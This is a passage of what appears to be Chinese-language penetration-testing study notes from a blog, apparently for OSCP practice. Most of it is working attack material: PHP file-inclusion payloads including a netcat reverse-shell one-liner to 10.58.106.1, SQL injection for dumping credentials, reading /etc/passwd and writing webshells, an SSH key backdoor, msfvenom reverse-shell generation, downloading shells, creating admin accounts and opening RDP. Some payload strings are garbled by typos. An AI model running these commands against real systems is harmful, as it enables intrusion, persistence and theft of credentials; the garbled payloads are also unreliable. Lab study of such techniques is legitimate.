title="文件包含"></a>文件包含</h2><p>污染日志文件，如果知道目标主机的日志目录，比如ssh日志，这个时候去用php一句话作为用户名去连接目标主机，日志文件中就会有PHP一句话，然后再用文件包含去执行php的webshell，或者是web日志也可</p><p>前提是知道日志路径、日志路径可写、可以跨web目录去进行文件包含</p><p>或者可以在服务器上搭建一个webshell，然后文件包含去访问</p><p>Windows下文件包含要用\</p><p>有时候执行命令的get参数用？不行的话，可以试一下&amp;</p><p>%00截断，在某些情况下有效，可以在要包含的文件如&#x2F;etc&#x2F;passwd后面加上%00去截断</p><p>..&#x2F;被过滤，将..&#x2F;进行url编码，即%2e%2e%2f，或者试一下….&#x2F;</p><p>文件包含也可以结合文件上传来利用，上传一个png，png里是webshell</p><h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">支持明文和Base64编码数据</span><br><span class="line"></span><br><span class="line">http://10.11.0.22/menu.php?file=data:text/plain,hello world</span><br><span class="line"></span><br><span class="line">不指定文件，直接把代码当作PHP解析</span><br><span class="line">http://10.11.0.22/menu.php?file=data:text/plain,&lt;?php echo shell_exec(&quot;id&quot;)?&gt;</span><br><span class="line">data:/textiplain;base64,PD9waHAgHZhcj1zaGVsbF9leGVjKCRfROVUWydjbWQnXSk7IGVjaG8gJHZhciA/Pg==&amp;cmd=id</span><br><span class="line"></span><br><span class="line">base64编码，绕过过滤</span><br><span class="line">data://text/plain;base64,PD9waHAgJHZhcj1zaGVsbF9leGVjKCRfROVUWydjbwQnXSk7IGVjaG8gJHZhciA/Pg==&amp;cmd=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f(/bin/sh+-i+2&gt;%261/nc+10.58.106.1+3333+&gt;/tmplf</span><br></pre></td></tr></table></figure><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>‘单引号是从前往后成对匹配的</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;select * from users where username=&#x27;&#x27;&#x27; and password=&#x27;password123&#x27;&quot;;</span><br><span class="line">#最后的单引号多出来了</span><br></pre></td></tr></table></figure><p>万能密码 tom’ or 1&#x3D;1</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> users <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;tom&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span>;# <span class="string">&#x27;and password = &#x27;</span>jones<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">select * from users where name = &#x27;</span>tom<span class="string">&#x27; or 1=1 LIMIT 1;#如果上一个用不了，加上LIMIT 1试一下</span></span><br></pre></td></tr></table></figure><p>先确定是不是字符型，如果返回的报错信息里有’单引号，那么很可能是字符型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">error near &#x27;xxxxxx&#x27;&#x27;#最前面和最后面的单引号不算</span><br><span class="line">error near &#x27;&#x27;&#x27;&#x27;&#x27; </span><br><span class="line"></span><br><span class="line">如果报错是</span><br><span class="line">error near &#x27; \&#x27; &#x27;</span><br><span class="line">就是数值型，并且服务器转义</span><br></pre></td></tr></table></figure><p>可以用limit来指定要取哪一条数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">limit a,b#表示以a为起始索引，取b个</span><br></pre></td></tr></table></figure><p>然后推测后端查询语句的大概逻辑，比如这里是字符型</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> username,email <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;$input&#x27;</span>;</span><br><span class="line">那么就可以构造</span><br><span class="line"><span class="keyword">select</span> username,email <span class="keyword">from</span> users <span class="keyword">where</span> id <span class="operator">=</span> <span class="string">&#x27;1 or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span><span class="string">&#x27;;</span></span><br></pre></td></tr></table></figure><p>再使用order by推测select后面是有几个字段，即select xxx 这里的xxx有几个字段，因为后续要用联合查询去查别的表。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> fname, sname,<span class="number">3</span>,<span class="number">4</span> <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">5</span># <span class="string">&#x27; ;</span></span><br></pre></td></tr></table></figure><p>如果order by 4没报错，by 5报错了，那么就是4个字段</p><p>或者用union select也可以判断</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> fname,sname frem users <span class="keyword">where</span> id<span class="operator">=</span> <span class="string">&#x27;1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span># <span class="string">&#x27; ;</span></span><br><span class="line"><span class="string">#查数据库名</span></span><br><span class="line"><span class="string">select fname,sname frem users where id= &#x27;</span><span class="number">1</span><span class="string">&#x27; union select version(),database()# &#x27;</span> ;</span><br></pre></td></tr></table></figure><p>查指定数据库的所有表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> fname,name <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span> <span class="string">&#x27; &#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> table_name,<span class="number">2</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;dvwa&#x27;</span>#<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>查指定表的所有字段名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> fname,name <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> column_name,<span class="number">2</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;dvwa&#x27;</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>#</span><br></pre></td></tr></table></figure><p>查指定数据库下的表的所有字段的数据</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> fname,name <span class="keyword">from</span> users <span class="keyword">where</span> id<span class="operator">=</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">user</span>, password <span class="keyword">from</span> dvwa.users#</span><br></pre></td></tr></table></figure><p>读取敏感文件</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,load_file(<span class="string">&#x27;/etc/passwd&#x27;</span>)#</span><br></pre></td></tr></table></figure><p>写入webshell</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,&quot;php shell&quot; <span class="keyword">INTO</span> DUMPFILE <span class="string">&#x27;/var/www/htm1/shell.php&#x27;</span>#</span><br></pre></td></tr></table></figure><p>绕过服务器转义</p><p>比如注入table_schema&#x3D;’xxx’的时候报错</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">near <span class="string">&#x27;\&#x27;</span>dvwa\<span class="string">&#x27;#&#x27;</span> <span class="keyword">at</span> line <span class="number">1</span></span><br><span class="line"></span><br><span class="line">#可以用table_schema<span class="operator">=</span>database()</span><br><span class="line">#table_schema<span class="operator">=</span><span class="number">0x64767761</span>（十六进制的dvwa）</span><br></pre></td></tr></table></figure><h3 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h3><p>服务器只返回yes or no</p><p>如果提交的是1#，返回yes，提交1’#也正常返回，说明是字符型，会闭合单引号</p><p>盲注payload一般使用and逻辑</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">判断字段数，这里id值要选存在的</span><br><span class="line">id=&#x27;1&#x27; order by 3# </span><br><span class="line"></span><br><span class="line">使用union select，这里id值要选不存在的</span><br><span class="line">不能用id=&#x27;1&#x27; union select 1,2#，因为union相当于或的关系，id=&#x27;1&#x27;为true，整体一定为true，无法根据返回的yes或no来判断</span><br><span class="line"></span><br><span class="line">盲注数据库名，使用SUBSTRING(database(),1,1)，表示从第一个字符开始，取一个字符</span><br><span class="line"></span><br><span class="line">and SUBSTRING(BIN(ASCII(SUBSTRING(database(),1,1))),4,1)&gt;0#</span><br><span class="line">表示取数据库名的第一个字母，转成二进制的ASCII码，一共7位，这里判断的是第四位是否为1</span><br></pre></td></tr></table></figure><h2 id="命令注入"><a href="#命令注入" class="headerlink" title="命令注入"></a>命令注入</h2><p>分隔不同命令的符号有</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">; | &amp; &amp;&amp;</span><br></pre></td></tr></table></figure><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cp /usr/share/webshells/php/php-reverse-shell.php ./shell3.jpg</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Pentest </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透杂项</title>
      <link href="/2024/06/05/%E6%B8%97%E9%80%8F%E6%9D%82%E9%A1%B9/"/>
      <url>/2024/06/05/%E6%B8%97%E9%80%8F%E6%9D%82%E9%A1%B9/</url>
      
        <content type="html"><![CDATA[<h2 id="扫描命令"><a href="#扫描命令" class="headerlink" title="扫描命令"></a>扫描命令</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sC -sS -p0-65535 sandbox.local</span><br><span class="line">sudo nmap -p22,80 -sV -A sandbox.local</span><br><span class="line"># 端口扫描，多跑几次</span><br><span class="line">sudo nmap --min-rate 10000 -p- 192.168.220.118</span><br><span class="line">sudo nmap -p22,80 -sV -A sandbox.local</span><br><span class="line"></span><br><span class="line"># 目录扫描</span><br><span class="line">dirsearch -u http://192.168.212.89 -f -e php,txt,html,zip,rar,tar.gz,tar -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">dirsearch -u http://192.168.237.80 -f -e php,txt,html,zip,rar,tar.gz,tar -w /usr/share/dirb/wordlists/common.txt</span><br><span class="line">gobuster dir -u http://192.168.178.80 -w /usr/share/wordlists/dirb/common.txt</span><br><span class="line">dirsearch -u http://172.16.33.62:7601/ -x 403</span><br><span class="line">dirb http://10.0.2.5/cgi-bin /usr/share/wordlists/dirb/big.txt</span><br><span class="line">gobuster dir -u http://192.168.178.80 -x html,php,txt -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt</span><br><span class="line"></span><br><span class="line"># 扫描.zip文件</span><br><span class="line">gobuster dir -u http://192.168.1.22 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .zip</span><br><span class="line"></span><br><span class="line"># Fuzz参数</span><br><span class="line">ffuf -u &#x27;http://192.168.179.80:80/console/file.php?FUZZ=/etc/passwd&#x27; -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -fs 0</span><br></pre></td></tr></table></figure><h2 id="SSH后门"><a href="#SSH后门" class="headerlink" title="SSH后门"></a>SSH后门</h2><p>本地提权之后可以上传ssh公钥，保持长期访问权限</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ssh -keygen</span><br><span class="line">cat ~/.ssh/id_rsa.pub</span><br><span class="line">mkdir /root/.ssh # 被控机器执行</span><br><span class="line">echo &quot;ssh-rsa AAAxxxxxxx...kali@kali&quot; &gt; /root/.ssh/authorized_keys</span><br><span class="line"></span><br><span class="line">SSH连接目标主机</span><br><span class="line">ssh root@sandbox.local</span><br></pre></td></tr></table></figure><h2 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a>MSF</h2><p>auxiliary是探测类型的模块</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">use 模块名</span><br><span class="line">search 关键字</span><br><span class="line">search type:auxiliary name:smb</span><br><span class="line">sessions 查看当前session</span><br><span class="line">session -i $id 进入指定的session</span><br><span class="line">run -j 后台运行</span><br><span class="line">bg 把当前session放到后台</span><br><span class="line">migrate $PID 进程迁移</span><br></pre></td></tr></table></figure><p>除了基本 Payload，Metasploit还包含多种高级 Payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Staged vs Non-Staged Payloads</span><br><span class="line">Non-Staged:不分阶段Payload 与EXP一起被完整地发送到目标系统</span><br><span class="line"></span><br><span class="line">Staged:分阶段Payload通常分为两部分</span><br><span class="line">第一部分较小，负责建立反弹连接，然后传输较大的第二部分Payload 并执行</span><br><span class="line">当没有足够的缓存空间来存储完整的Payload</span><br><span class="line">避免被AV软件发现，第一阶段不包含明显特征的恶意代码，利用其加载第二阶段代码到内存中执行</span><br></pre></td></tr></table></figure><p>名称中的‘&#x2F;’用来指示Payload是否分阶段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">不分阶段:shell_reverse_tcp</span><br><span class="line">分阶段:shell/reverse_tcp</span><br></pre></td></tr></table></figure><h2 id="Meterpreter-Shell"><a href="#Meterpreter-Shell" class="headerlink" title="Meterpreter Shell"></a>Meterpreter Shell</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">search meterpreter type:payload</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br></pre></td></tr></table></figure><p>上传下载时目标主机路径要加双\</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">upload /usr/share/windows-resources/binaries/nc.exe c:\\Users\\Offsec</span><br><span class="line">download c:\\Windows\\system32\\calc.exe /tmp/calc.exe</span><br></pre></td></tr></table></figure><p>msfvenom</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.12 LPORT=443 -f exe -o r.exe</span><br><span class="line">然后kali开侦听</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/shell_reverse_tcp</span><br></pre></td></tr></table></figure><p>OSCP考试中不能用msf作跳板</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">route add 内网网段</span><br><span class="line">然后msf内部直接访问内网网段即可</span><br></pre></td></tr></table></figure><p>除了手动添加内网路由穿透内网，也可以使用autoroute模块，自动利用已建立的Meterpreter会话穿透内网</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; use multi/manage/autoroute</span><br><span class="line">msf5 post(multi/managelautoroute) &gt; sessions -l</span><br><span class="line">msf5 post(multi/managelautoroute) &gt; set session 4</span><br><span class="line">msf5 post(multi/manage/autoroute) &gt; exploit</span><br></pre></td></tr></table></figure><p>结合路由和server&#x2F;socks4a模块，配置socks4a代理，允许外部工具直接访问内网</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf5 post(multi/manage/autoroute) &gt; use auxiliary/server/socks4a</span><br><span class="line">msf5 auxiliary(server/socks4a) &gt; set SRVHOST 127.0.0.1</span><br><span class="line">msf5 auxiliary(server/socks4a) &gt; exploit -j</span><br></pre></td></tr></table></figure><p>配置Proxychains ,挂代理访问内网</p><h2 id="跨平台编译"><a href="#跨平台编译" class="headerlink" title="跨平台编译"></a>跨平台编译</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install mingw-w64</span><br><span class="line">i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe #报错</span><br><span class="line">i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32</span><br><span class="line"></span><br><span class="line">编译32位C语言Windows程序</span><br><span class="line">i686-w64-mingw32-gcc</span><br><span class="line">编译64位C语言Windows程序</span><br><span class="line">x86_64-w64-mingw32-gcc</span><br><span class="line">编译32位C++语言Windows程序</span><br><span class="line">i686-w64-mingw32-g++</span><br><span class="line">编译64位C++语言Windows程序</span><br><span class="line">x86_64-w64-mingw32-g++</span><br></pre></td></tr></table></figure><h2 id="SMB-Service"><a href="#SMB-Service" class="headerlink" title="SMB Service"></a>SMB Service</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L 192.168.222.11 # 匿名登录smb</span><br><span class="line">smbmap -H 192.168.222.11</span><br><span class="line">smbclient //192.168.222.11/IPC$ # 匿名查看共享目录</span><br><span class="line">遇到SMB服务一定记得试一下能不能put上传文件</span><br><span class="line">enum4linux -a 192.168.0.109 # 枚举用户等各种信息，在拿不到用户名的时候可以尝试</span><br></pre></td></tr></table></figure><h2 id="字符串加解密相关"><a href="#字符串加解密相关" class="headerlink" title="字符串加解密相关"></a>字符串加解密相关</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;++++++++++++++++.++++.&gt;&gt;+++++++++++++++++.----.&lt;++++++++++.-----------.&gt;-----------.++++.&lt;&lt;+.&gt;-.--------.++++++++++++++++++++.&lt;------------.&gt;&gt;---------.&lt;&lt;++++++.++++++.</span><br><span class="line">这种叫Brainfuck/Ook! decode</span><br></pre></td></tr></table></figure><h2 id="压缩包破解"><a href="#压缩包破解" class="headerlink" title="压缩包破解"></a>压缩包破解</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zip2john tom.zip &gt;&gt; has1.txt</span><br><span class="line">john has1.txt #会输出压缩包密码</span><br></pre></td></tr></table></figure><h2 id="渗透常用命令"><a href="#渗透常用命令" class="headerlink" title="渗透常用命令"></a>渗透常用命令</h2><p>ssh指定密钥登录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -i key root@ip</span><br></pre></td></tr></table></figure><p>echo写入webshell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#x27;&lt;?php xxx&gt;&#x27; &gt;&gt; webshell.php.jpg # 单引号</span><br></pre></td></tr></table></figure><p>对隐写的文件进行分析提取 -p是指定密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">steghide extract -sf test.jpg -p 123456</span><br></pre></td></tr></table></figure><p>绕过restricted shell，一般就ssh加上-t “bash –noprofile”</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.hackingarticles.in/multiple-methods-to-bypass-restricted-shell/?source=post_page-----c9182b63a4de--------------------------------</span><br></pre></td></tr></table></figure><p>shellshock不一定打&#x2F;cgi-bin&#x2F;的cgi文件，打&#x2F;cgi-bin&#x2F;test这种后缀不是cgi的都可以</p><p>curl命令进行POST方式上传文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 第一个-F为指定本地上传的文件的路径，@符号必须要有，第二个-F为额外的自定义的参数，可以没有，大部分情况下得有，实际上就是POST传过去的数据</span><br><span class="line">curl -X POST -F &quot;file=@/home/xxx&quot; -F filename=&quot;/tmp/test.txt&quot; http://xxxx.xxx</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"># 生成木马</span><br><span class="line">msfvenom -p payload LPORT= LHOST= -f exe -o eee.exe</span><br><span class="line"></span><br><span class="line"># Windows下载文件</span><br><span class="line">iwr -uri http://192.168.45.192/win_shell.exe -Outfile C:\Windows\Temp\shell.exe</span><br><span class="line"></span><br><span class="line"># 开启3389</span><br><span class="line">REG ADD &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</span><br><span class="line">REG ADD &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /v PortNumber /t REG_DWORD /d 0x00000d3d /f</span><br><span class="line"></span><br><span class="line"># 修改windows防火墙配置允许3389</span><br><span class="line">netsh advfirewall firewall add rule name=&quot;Remote Desktop&quot; protocol=TCP dir=in localport=3389 action=allow</span><br><span class="line"></span><br><span class="line"># 新增Windows用户并设置为管理员</span><br><span class="line">net user name password /add</span><br><span class="line">net localgroup administrators 用户名 /add</span><br><span class="line"></span><br><span class="line"># Kali开启ssh</span><br><span class="line">sudo systemctl start ssh</span><br><span class="line"></span><br><span class="line"># Windows访问目标机器共享文件夹</span><br><span class="line">Win+R，然后\\目标IP</span><br><span class="line"></span><br><span class="line"># 内网主机发现（ping扫描）</span><br><span class="line">for /L %i in (1,1,255) do @ping -n 1 -w 200 10.5.5.%i &gt; nul &amp;&amp; echo 10.5.5.%i is up</span><br><span class="line">for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done</span><br><span class="line"></span><br><span class="line"># win下载文件</span><br><span class="line">iwr -uri http://192.168.119.2/nonstaged.exe -Outfile nonstaged.exe</span><br><span class="line"></span><br><span class="line"># rdp</span><br><span class="line">xfreerdp /v:192.168.155.152 /u:student /p:lab</span><br></pre></td></tr></table></figure><h2 id="系统常用命令"><a href="#系统常用命令" class="headerlink" title="系统常用命令"></a>系统常用命令</h2><h3 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h3><p>查找指定名称的文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">2&gt;/dev/null是将错误信息重定向到垃圾回收系统</span></span><br><span class="line">find / -name Settings.*  2&gt;/dev/null #looking through the files</span><br></pre></td></tr></table></figure><p><a href="https://www.ddosi.org/oscp-cheat-sheet-2/">https://www.ddosi.org/oscp-cheat-sheet-2/</a></p><p>which在$PATH环境变量中搜索指定名称的文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo $PATH</span><br><span class="line">which sbd</span><br></pre></td></tr></table></figure><p>locate命令，通过搜索locate.db文件来定位目标文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">使用updatedb命令可升级locate.db</span></span><br><span class="line">sudo updatedb</span><br><span class="line">locate sbd.exe</span><br></pre></td></tr></table></figure><p>find 命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">彻底搜索文件系统</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">支持基于名称、时间、大小、所有者、文件类型、时间戮、权限等条件的搜索</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">搜索最近 24 小时修改过的文件</span></span><br><span class="line">find / -mtime 0  </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">搜索最近30分钟修改过的文件</span> </span><br><span class="line">find . -type f -iname &#x27;*.sh&#x27; -mmin -30 -ls </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">对搜索结果执行命令（删除）</span> </span><br><span class="line">find . -name .svn -exec rm -rfo &#123;&#125; \; </span><br><span class="line">find . -name .svn | xargs rm -rf </span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">搜索启用 SUID 权限的文件</span></span><br><span class="line">find / -type f -perm -u=s -ls 2&gt;/dev/null </span><br></pre></td></tr></table></figure><p>查看系统中可用的服务</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl list-unit-files</span><br></pre></td></tr></table></figure><h3 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h3><p>查看文件内容</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">type $fileName</span><br></pre></td></tr></table></figure><p>查看所有文件（包括隐藏文件）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dir /a</span><br><span class="line">#查看所有文件及其属性</span><br><span class="line">attrib * 